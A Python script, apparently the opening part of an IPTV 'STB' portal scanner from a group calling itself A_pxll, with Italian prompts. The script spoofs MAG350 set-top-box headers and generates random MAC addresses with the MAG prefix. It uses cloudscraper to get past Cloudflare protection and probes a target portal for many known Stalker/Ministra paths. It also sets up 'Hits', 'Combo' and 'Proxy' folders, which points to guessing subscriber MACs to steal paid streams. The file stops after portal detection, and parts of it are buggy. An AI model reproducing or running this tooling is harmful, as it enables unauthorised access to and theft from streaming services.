# -*- coding: utf-8 -*-
import os
import sys
import pip
import json
import datetime
import time
import re
import socket
import hashlib
import pathlib
import random
import warnings

import platform

NOME = "STB5PRO"
if sys.platform.startswith("win"):
    import ctypes

    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f"""]2;{NOME} """)


# -----------------------[ System ]----------------------#
def cls():
    os.system("cls" if os.name == "posix" else "clear")


my_os = platform.system()
if my_os == "Windows":
    rootDir = "."
    my_os = "Wɪɴᴅᴏᴡs"
else:
    rootDir = "./sdcard/"
    my_os = "Aɴᴅʀᴏɪᴅ"
# -----------------------[ Header ]----

import os
#from playsound import playsound

os.system("cls" if os.name == "nt" else "clear")

# subprocess.run(['clear', ''])
try:
    from colorama import Back, Fore, Style, init
except ModuleNotFoundError:
    print("\33[32m[Colorama] Installing module...\33[0m \n")
    pip.main(["install", "colorama"])
    print("\n\33[33m[Colorama] Module installed!\33[0m \n")
    from colorama import Back, Fore, Style, init
warnings.filterwarnings("ignore")
nickn = ""
try:
    import subprocess
except:
    pip.main(["install", "subprocess"])
    import subprocess
try:
    import threading
except:
    pass
try:
    import requests
except:
    pip.main(["install", "requests"])
    import requests
# subprocess.run(['clear', ''])
try:
    import cfscrape
except:
    pip.main(["install", "cfscrape"])
    # import cfscrape
# subprocess.run(['clear', ''])
try:
    import cloudscraper
except:
    pip.main(["install", "cloudscraper"])
    import cloudscraper
# subprocess.run(['clear', ''])
try:
    import flag
except:
    pip.main(["install", "emoji-country-flag"])
    import flag
try:
    import pyshorteners
except:
    pip.main(["install", "pyshorteners"])
    import pyshorteners
# subprocess.run(['clear', ''])
try:
    import getmac
except:
    pip.main(["install", "getmac<1.0.0"])
    import getmac
# subprocess.run(['clear', ''])
try:
    import pycountry
except:
    pip.main(["install", "pycountry"])
    import pycountry
# subprocess.run(['clear', ''])
try:
    import geopy
except:
    pip.main(["install", "geopy"])
    import geopy
# subprocess.run(['clear', ''])
try:
    import termcolor
except:
    pip.main(["install", "termcolor"])
    import termcolor
# subprocess.run(['clear', ''])
try:
    import colorama
except:
    pip.main(["install", "colorama"])
    import colorama
# subprocess.run(['clear', ''])
try:
    import urllib
except:
    pip.main(["install", "urllib"])
    import urllib
# subprocess.run(['clear', ''])
try:
    import urllib3
except:
    pip.main(["install", "urllib3"])
    import urllib3
# subprocess.run(['clear', ''])

try:
    import nodejs
except:
    pip.main(["install", "nodejs"])
    import nodejs
try:
    from faker import Faker
except:
    pip.main(["install", "Faker"])
    from faker import Faker
try:
    import ipaddress
except:
    pip.main(["install", "ipaddress"])
    import ipaddress
# subprocess.run(['clear', ''])
try:
    import androidhelper as sl4a

    ad = sl4a.Android()
except:
    pass
try:
    import sock
except:
    pip.main(["install", "requests[socks]"])
    pip.main(["install", "sock"])
    pip.main(["install", "socks"])
    pip.main(["install", "PySocks"])
# subprocess.run(['clear', ''])
import sock
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
try:
    sesq = requests.Session()
    option = cfscrape.create_scraper(sess=sesq)
except:
    option = requests.Session()
logging.captureWarnings(True)
sidepanel = "fault"
csay = 0
say = 0
hitc = 0
pattern = "(\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2})"
# subprocess.run(['clear', ''])
import re as r

try:
    import platform
except:
    pip.main(["install", "platform"])
    import platform
uname = platform.uname()
# subprocess.run(['clear', ''])
# from getmac import get_mac_address
# from geopy.geocoders import Nominatim
from datetime import datetime, date
from urllib.request import urlopen
from random import uniform
from colorama import Fore, Back, Style

# import countrywrangler as cw
time_ = time.localtime()
date_ = time.strftime("%d.%m.%Y %H:%M")
start_time = time.strftime("%H:%M", time_)
start_time = start_time.replace(" ", "")
hit_time = time.strftime("%H:%M:%S", time_)
scan_time = time.strftime("%d.%m.%Y-%H:%M:%S", time_)
# subprocess.run(['clear', ''])
STB = """[0m

    
"""
Rimi = """




"""
Rimic = """

                                            """
Rimix = """


"""
WARNNING = """



[9 [93m
  ╔               「 🇮🇶 𝐁𝐲  𝐶𝑜𝑛𝑓𝑖𝑔  IQ                   
  ╚══════════════╾ ♤🔥  ᎶĦⓄ𝐬𝕋  ☹                                   ⠀\33[0m
           \33[0m
        [98m     GROUP A_pxll๛⏤‌🎃         
     [92m     Ⓦⓘⓝⓓⓞⓦⓢ🔹Ⓐⓝⓓⓡⓞⓘⓓ             [0m
\33[1;91m       ⧳━─⩥⟬ᴩʏ ᴄᴏɴғɪɴɢ ₐₗᵢ ₐₗₕₑDᵣₑ⟭⩤─━⧳                              \33[0m
     
\33[30;0m     𝙵  𝚁  𝙴  𝙴  -  𝙿 𝙰 𝙻 𝙴 𝚂 𝚃 𝙸 𝙽 𝙴      \33[0m       
[93m   --------------.        .--------------\33[0m
[93m    ---------    \  __  /    ---------
[93m       --------    \(  )/    --------
[93m          ------   ' \/ `   ------
[93m            ------ :    : -----
[93m              -----`    '-----
[93m                 `/`/..\`\`
[93m              ╼━━━UU━🌍━UU━━━╾   
[93m                   '//||\`
[93m                     ''``
         
"""
# subprocess.run(['clear', ''])
print(WARNNING)

liness = [" \x1b[91mThis script was created in a group A_pxll[0m"]
for linei in liness:
    for c in linei:
        print(c, end="")
        sys.stdout.flush()
        time.sleep(uniform(0, 0.1))
    print("")
ENTER = input(
    """\033[1;32m Click ENTER'![0m
"""
)
if ENTER == "":
    pass
else:
    # subprocess.run(['clear', ''])
    print(WARNNING)


    print(
        """[35m *(Inserisci il tuo nickname :)* Se non viene scritto nulla, il nome "A_pxll" verrà scritto automaticamente nel file HiTS.FiLE. [0m
"""
    )
    print("\x1b[91m    You have not agreed to the terms!  \x1b[0m")
    print(
        """[91m          Okay Fine. Thank you!  [0m
"""
    )
    print(
        """[91m                GOODBYE!  [90m
"""
    )
    quit()
# subprocess.run(['clear', ''])
print(STB)

Rimiz = """
       

 """


Rimiw = """
     
"""



def clear():
    os.system("cls" if os.name == "nt" else "clear")


if not os.path.exists(rootDir + "/ALBSTB/"):
    os.mkdir(rootDir + "/ALBSTB/")
if not os.path.exists(rootDir + "/ALBSTB/Hits/"):
    os.mkdir(rootDir + "/ALBSTB/Hits/")
if not os.path.exists(rootDir + "/ALBSTB/Combo/"):
    os.mkdir(rootDir + "/ALBSTB/Combo/")
if not os.path.exists(rootDir + "/ALBSTB/Proxy/"):
    os.mkdir(rootDir + "/ALBSTB/Proxy/")
if not os.path.exists(rootDir + "/ALBSTB/Sound/"):
    os.mkdir(rootDir + "/ALBSTB/Sound/")
os.makedirs(rootDir + "/ALBSTB/Hits/FULL/", exist_ok=True)
os.makedirs(rootDir + "/ALBSTB/Hits/SHORT/", exist_ok=True)
os.makedirs(rootDir + "/ALBSTB/Hits/MACs/", exist_ok=True)


BLACK = "\x1b[30m"
RED = "\x1b[31m"
GREEN = "\x1b[32m"
YELLOW = "\x1b[33m"
BLUE = "\x1b[34m"
MAGENTA = "\x1b[35m"
CYAN = "\x1b[36m"
WHITE = "\x1b[37m"
RESETz = "\x1b[39m"
GREYa = "\x1b[90m"
REDa = "\x1b[91m"
GREENa = "\x1b[92m"
YELLOWa = "\x1b[93m"
PURPLEa = "\x1b[94m"
PINKa = "\x1b[95m"
CYANa = "\x1b[96m"
REDc = "\x1b[1;31m"
REDx = "\x1b[1;91m"
GREENc = "\x1b[1;32m"
YELLOWc = "\x1b[1;33m"
BLUEc = "\x1b[1;34m"
MAGENTAc = "\x1b[1;35m"
CYANc = "\x1b[1;36m"
WHITEc = "\x1b[1;37m"
RESETc = "\x1b[1;39m"
BRIGHTs = "\x1b[1m"
DIMs = "\x1b[2m"
NORMALs = "\x1b[22m"
RESET = "\x1b[0m"
WV5 = "\x1b[0;4;90m"
PREMI = "\x1b[0;4;90m"
from pyshorteners import Shortener

m3uu = pyshorteners.Shortener()
from urllib.parse import urlparse
from http.client import HTTPConnection, HTTPSConnection

nick0 = "✯py A_pxll✯"

nickn = input(
    """[0m        

[0m[33m	 *(Inserisci il tuo soprannome :)*
Se non viene scritto nulla, nel file HiTS.FiLE verrà scritto automaticamente il nome "A_pxll".[36m

        nickname:
      = [0m[92m[92m[92m"""
)
if nickn == "":
    nickn = "A_pxll"
if nickn == "0":
    nickn = nick0
if nickn == "0.":
    nickn = nick1
if nickn == "0.1":
    nickn = nick2
if nickn == "0.2":
    nickn = nick3
if nickn == ".003":
    nickn = nick4
if nickn == ".007":
    nickn = nick5
mtype = ""
proxyslen = 0
headers = {}
ss = ""
ssx = ""
pano = ""
stbb = ""
author = ""
authorc = ""
authorz = ""
realblue = ""
albstb2 = ""
albstb3 = ""
agentx = ""
attack = ""
authorx = ""
useragent = ""
http = "http"
HTTPFAIL = ""
PHPURL = ""
clear()
print(Rimi)
print(
    """         [32mSCRIVI UN PORTALE DA SCANSIONARE [0m
"""
)
lines = ["\x1b[96m ◌Portal➥ \x1b[93mBasta aggiungere portale:port", "  farà tutto da solo\x1b[0m"]
for line in lines:
    for c in line:
        print(c, end="")
        sys.stdout.flush()
        time.sleep(uniform(0, 0.1))
    print("")
clear()
print(Rimi)
print(
    """         [32mSCRIVI UN PORTALE DA SCANSIONARE [0m
"""
)
panel = input("\x1b[96m ◌Portal➥ \x1b[0m\x1b[31m\x1b[31m")
if panel == "":
    print(
        """
[0mWrong: Portal URL cannot be empty!"""
    )
    quit()
panel = panel.replace("https://", "")
panel = panel.replace("http://", "")
panel = panel.replace("/c/", "")
BASE_Panel = panel
if "/" in panel:
    panels = panel.split("/")[0]
    panels = panels.replace("/c", "")
    panels = panels.replace("/", "")
    panels = panels.replace(" ", "")
else:
    panels = panel
tags = [
    "https://",
    "http://",
    "/stalker_portal",
    "/rmxportal",
    "/cmdforex",
    "/portalstb",
    "/magLoad",
    "/maglove",
    "/client",
    "/portalmega",
    "/ministra",
    "/korisnici",
    "/ghandi_portal",
    "/magaccess",
    "/blowportal",
    "/emu2",
    "/emu",
    "/tek",
    "/Link_OK",
    "/bs.mag.portal",
    "/bStream",
    "/delko",
    "/portal",
    "/c/",
]
for tag in tags:
    panels = panels.replace(tag, "")
URLS = panels
BASE_URL = panels
clear()
print(Rimi)
print(f"  {GREEN}Automatic Check Portal & Protocol {RESET}")
print("\x1b[33m       Please wait...[Debug->] \x1b[0m")


def check_http(url):
    HTTP_URL = f"http://{url}"
    try:
        HTTP_URL = urlparse(HTTP_URL)
        connection = HTTPConnection(HTTP_URL.netloc, timeout=2)
        connection.request("HEAD", HTTP_URL.path)
        if connection.getresponse():
            return True
        return False
    except:
        return False
        return None


def check_https(url):
    HTTPS_URL = f"https://{url}"
    try:
        HTTPS_URL = urlparse(HTTPS_URL)
        connection = HTTPSConnection(HTTPS_URL.netloc, timeout=3)
        connection.request("HEAD", HTTPS_URL.path)
        if connection.getresponse():
            return True
        return False
    except:
        return False
        return None


if __name__ == "__main__":
    if check_http(BASE_URL):
        clear()
        print(Rimi)
        http = "http"
        print(f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}")
        print(f"  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}")
        printxi = f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}"
        print("\x1b[33m     Please wait --> [Debug] \x1b[0m")
    elif check_https(BASE_URL):
        clear()
        print(Rimi)
        http = "https"
        print(f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}")
        print(f"  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}")
        printxi = f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}"
        print("\x1b[33m     Please wait --> [Debug] \x1b[0m")
    else:
        clear()
        print(Rimi)
        http = "http"
        HTTPFAIL = "FAILED"
        print(f"  {REDa}╓➛FAILED Checking Protocol?!! {RESET}")
        print(f"  {REDa}╙➛TIP: Use Proxy and continue. {RESET}")
        printxi = f"""  {REDa}╓➛FAILED Checking Protocol?!! {RESET}\n  {REDa}╙➛TIP: Use Proxy and continue. {RESET}"""
        print("\x1b[33m     Please wait...[Debugging] \x1b[0m")
import random

macx = "00%3A1A%3A79%3A00%3A00%3A00"
try:
    macx = "00:1A:79:%02X:%02X:%02X" % (
        random.randint(0, 256),
        random.randint(0, 256),
        random.randint(0, 256),
    )
    macx = macx.replace(":100", ":10")
    macx = macx.upper().replace(":", "%3A")
except:
    pass
HEADERAb = {
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG350 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    "Referer": http + "://" + BASE_Panel + "/c/",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cookie": "mac=" + macx + "; stb_lang=en; timezone=Europe%2FParis;",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded,text/javascript;charset=UTF-8",
    "Connection": "Keep-Alive",
    "X-User-Agent": "Model: MAG350; Link: Ethernet",
}


def check_aurora(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/aurora"
    PHPURL = f"{URLS}/aurora"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_portalu(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/portal"
    PHPURL = f"{URLS}/portal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_rmxportal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/rmxportal"
    PHPURL = f"{URLS}/rmxportal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_cmdforex(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/cmdforex"
    PHPURL = f"{URLS}/cmdforex"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_normal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}"
    PHPURL = URLS
    try:
        connection = option.get(PHP_URL + "/c/version.js", headers=HEADERAb, timeout=2)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_stalker_portal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/stalker_portal"
    PHPURL = f"{URLS}/stalker_portal"
    try:
        connection = option.get(PHP_URL + "/c/version.js", headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_stalker_portal_c_(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/stalker_portal/c_/"
    PHPURL = f"{URLS}/stalker_portal/c_"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_stalker_portal_stb_(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/stalker_portal/stb"
    PHPURL = f"{URLS}/stalker_portal/stb"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_portalstb(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/portalstb"
    PHPURL = f"{URLS}/portalstb"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_maglove(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/maglove"
    PHPURL = f"{URLS}/maglove"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_client(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/client"
    PHPURL = f"{URLS}/client"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_magportal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/magportal"
    PHPURL = f"{URLS}/magportal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_magaccess(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/magaccess"
    PHPURL = f"{URLS}/magaccess"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_powerfull(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/powerfull"
    PHPURL = f"{URLS}/powerfull"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_ministra(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/ministra"
    PHPURL = f"{URLS}/ministra"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_korisnici(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/korisnici"
    PHPURL = f"{URLS}/korisnici"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_ghandi_portal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/ghandi_portal/c/"
    PHPURL = f"{URLS}/ghandi_portal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_blowportal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/blowportal"
    PHPURL = f"{URLS}/blowportal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_extraportal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/extraportal"
    PHPURL = f"{URLS}/extraportal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_bs_mag_portal(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/bs.mag.portal"
    PHPURL = f"{URLS}/bs.mag.portal"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_Link_OK(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/Link_OK"
    PHPURL = f"{URLS}/Link_OK"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_bStream(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/bStream"
    PHPURL = f"{URLS}/bStream"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_delko(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/delko/"
    PHPURL = f"{URLS}/delko"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_emu2(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/emu2/"
    PHPURL = f"{URLS}/emu2"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_emu(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/emu/"
    PHPURL = f"{URLS}/emu"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_mag(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/mag/"
    PHPURL = f"{URLS}/mag"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_tek(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/tek/"
    PHPURL = f"{URLS}/tek"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_c_(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/c_/"
    PHPURL = f"{URLS}/c_"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_kk(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/k/"
    PHPURL = f"{URLS}/k"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_cp(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/cp/"
    PHPURL = f"{URLS}/cp"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


def check_pp_(URLS):
    global PHPURL
    PHP_URL = f"{http}://{URLS}/p/"
    PHPURL = f"{URLS}/p"
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False


vrdata = "5.6.6"
vrdataC = f" {YELLOW}| {MAGENTA}v{vrdata}"
if not panel == "":
    phpdata = ""
    phpdata2 = ""
    phptitle = ""
    stalker_ = ""
    infophp = ""
    phpauto = ""
    phptit = ""
    info = ""
    phpX = ""
    phpd = ""
    down = ""
    clfe = ""
    ccff = ""
    cse = ""
    sp = ""
    cf = ""
    cc = ""
    HTTP_HTTP = "False"
    HTTPS_HTTPS = "False"
    if check_normal(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = ""
        phpdata2 = "server/load.php"
    elif check_magaccess(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = "PHP"
    elif check_powerfull(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_ministra(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = "PHP"
    elif check_portalstb(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_maglove(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_client(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_magportal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_korisnici(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_blowportal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_extraportal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_rmxportal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_cmdforex(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_ghandi_portal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_bs_mag_portal(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_Link_OK(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_bStream(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_delko(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_emu2(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_emu(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_mag(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_tek(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_portalu(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_aurora(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = "PHP"
    elif check_c_(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_kk(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_cp(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_pp_(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = "PHP"
    elif check_stalker_portal_c_(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = ""
        stalker_ = "stalker_portal"
        phpdata2 = "server/load.php"
    elif check_stalker_portal_stb_(URLS):
        panels = f"{PHPURL}/"
        panel = PHPURL
        phpX = ""
        stalker_ = "stalker_portal"
        phpdata2 = "server/load.php"
    elif check_stalker_portal(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = ""
        stalker_ = "stalker_portal"
        phpdata2 = "server/load.php"
    elif check_stalker_portal(URLS) and check_normal(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = ""
        phpdata2 = "server/load.php"
    elif check_normal(URLS):
        panels = f"{PHPURL}/c/"
        panel = PHPURL
        phpX = ""
    else:
        panel = panels
        panels = f"{panels}/c/"
        phpX = ""
    HEADERAc = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
        "Referer": http + "://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macx + "; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG350; Link: Ethernet",
    }
    if HTTPFAIL == "FAILED":
        HTTPX = f"http://{panels}"
        HTTPSX = f"https://{panels}"
        try:
            connection = option.get(HTTPX, headers=HEADERAc, timeout=2)
            if connection.status_code == 200:
                HTTP_HTTP = "True"
            else:
                HTTP_HTTP = "False"
            connection = option.get(HTTPSX, headers=HEADERAc, timeout=2)
            if connection.status_code == 200:
                HTTPS_HTTPS = "True"
            else:
                HTTPS_HTTPS = "False"
        except:
            pass
        if HTTPS_HTTPS == "True":
            http = "https"
            HTTPFAIL = ""
            clear()
            print(Rimi)
            print(f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}")
            print(f"  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}")
            printxi = f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}"
            print("\x1b[33m         [Debugging-OK] \x1b[0m")
        elif HTTP_HTTP == "True":
            http = "http"
            HTTPFAIL = ""
            clear()
            print(Rimi)
            print(f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}")
            print(f"  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}")
            printxi = f"  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}"
            print("\x1b[33m         [Debugging-OK] \x1b[0m")
        else:
            HTTPFAIL = "FAILED"
            clear()
            print(Rimi)
            print(f"  {REDa}╓➛FAILED Checking Protocol?!! {RESET}")
            print(f"  {REDa}╙➛TIP: Use Proxy and continue. {RESET}")
            printxi = f"  {REDa}╓➛FAILED Checking Protocol?!! {RESET}\n  {REDa}╙➛TIP: Portal down or IP blocked! {RESET}"
